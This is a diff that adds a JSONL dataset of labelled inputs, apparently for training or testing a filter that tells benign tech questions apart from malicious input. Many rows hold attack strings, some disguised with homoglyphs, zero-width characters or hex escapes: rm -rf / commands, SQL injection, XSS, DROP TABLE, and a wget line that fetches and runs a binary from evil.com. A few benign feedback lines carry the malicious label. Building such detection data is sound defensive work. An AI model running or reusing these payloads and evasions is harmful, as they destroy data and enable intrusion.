@@ -1,0 +1,67 @@
+{"text": "rm    -rf    /", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "SELECT * FROM users WHERE id%3D1 OR 1%3D1", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "SELECT * FRоM users WHERE id=1 OR 1=1", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "What are the benefits of TLS?", "label": 1, "category": "technical_question", "subcategory": "augmented", "pattern": "technical_question"}
+{"text": "wget    http://evil.cоm/exploit    -O    /tmp/x    &&    chmod    +x    /tmp/x    &&    /tmp/x", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "What is the recommended way to use Kubernetes?", "label": 1, "category": "best_practice", "subcategory": "augmented", "pattern": "best_practice"}
+{"text": "What is the difference between AWS and Kubernetes?", "label": 1, "category": "technical_question", "subcategory": "augmented", "pattern": "technical_question"}
+{"text": "Explain git merge vs rebase", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA​", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "How should I implement Authentication?", "label": 1, "category": "best_practice", "subcategory": "augmented", "pattern": "best_practice"}
+{"text": "What should I know about Git?", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "I want to understand React better", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "I would recommend this.", "label": 0, "category": "feedback", "subcategory": "normal_benign"}
+{"text": "<script>alert('xss')</script>", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "What is the difference between HTTPS and JavaScript?", "label": 1, "category": "technical_question", "subcategory": "augmented", "pattern": "technical_question"}
+{"text": "I'm learning about Database", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "Explain TLS for beginners", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "How do I handle errors in Python?", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "UNION SELECT null, null, null FROM information_schema.tables", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "DROP​ TABLE ​users;", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "What are the best practices when working with API?", "label": 1, "category": "best_practice", "subcategory": "augmented", "pattern": "best_practice"}
+{"text": "How do I use API?", "label": 1, "category": "technical_question", "subcategory": "augmented", "pattern": "technical_question"}
+{"text": "What are best practices for Kubernetes?", "label": 1, "category": "best_practice", "subcategory": "augmented", "pattern": "best_practice"}
+{"text": "What are best practices for Python?", "label": 1, "category": "best_practice", "subcategory": "augmented", "pattern": "best_practice"}
+{"text": "Can you teach me about AWS?", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "This is exactly what I needed.", "label": 0, "category": "feedback", "subcategory": "normal_benign"}
+{"text": "What are the benefits of using Docker?", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "What should I know about JavaScript?", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "Hello, how are you?", "label": 1, "category": "unknown", "subcategory": "unknown", "pattern": "technical_question"}
+{"text": "Show me best practices for Authentication", "label": 1, "category": "best_practice", "subcategory": "augmented", "pattern": "best_practice"}
+{"text": "I'm learning about REST", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "Explain Git for beginners", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "I need help understanding SSL", "label": 1, "category": "technical_question", "subcategory": "augmented", "pattern": "technical_question"}
+{"text": "How does caching improve performance?", "label": 1, "category": "technical_question", "subcategory": "general_tech", "pattern": "technical_question"}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "​隐藏​字符‌", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "How should I implement OAuth?", "label": 1, "category": "best_practice", "subcategory": "augmented", "pattern": "best_practice"}
+{"text": "What are the best practices when working with Database?", "label": 1, "category": "best_practice", "subcategory": "augmented", "pattern": "best_practice"}
+{"text": "wgеt    http://evil.com/exploit    -O    /tmp/x    &&    chmod    +x    /tmp/x    &&    /tmp/x", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "SELECT  *  FRоM  users  WHERE  id=1  OR  1=1", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "eval('alert(1)')‌", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "exec('rm​ -rf ​/')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "I want to understand CI/CD better", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "How does authentication work?", "label": 1, "category": "security_education", "subcategory": "general_security", "pattern": "technical_question"}
+{"text": "Can you teach me about MongoDB?", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "jаvA.lang.Runtime.getRuntime().exec('rm\\x20-rf\\x20/')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "What are the best practices when working with GraphQL?", "label": 1, "category": "best_practice", "subcategory": "augmented", "pattern": "best_practice"}
+{"text": "​隐藏​字符​", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "Can you explain Git to me?", "label": 1, "category": "technical_question", "subcategory": "augmented", "pattern": "technical_question"}
+{"text": "eval('malicious    code')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "I want to understand DevOps better", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "SеLECT * FROM users WHERE id=1 OR 1=1", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "wget​ http://evil.com/exploit -O /tmp/x && chmod +x /tmp/x && ​/tmp/x", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "I want to understand Python better", "label": 1, "category": "educational", "subcategory": "augmented", "pattern": "educational"}
+{"text": "еxec('rm -rf /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "What is the difference between JWT and TLS?", "label": 1, "category": "technical_question", "subcategory": "augmented", "pattern": "technical_question"}
+{"text": "Can you explain PostgreSQL to me?", "label": 1, "category": "technical_question", "subcategory": "augmented", "pattern": "technical_question"}
+{"text": "java.lang.Runtime.getRuntime().exec('rm -rf /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "jаva.lang.Runtime.getRuntime().exec('rm​  -rf  /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "impоrt  os;  os.system('rm  -rf  /')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "UNION    SELECT    null,    null,    null    FROM    informаtion_schema.tables", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "еval('alert(1)')", "label": 0, "category": "malicious", "subcategory": "malicious"}
+{"text": "evаl('malicious    code')", "label": 0, "category": "malicious", "subcategory": "malicious"}
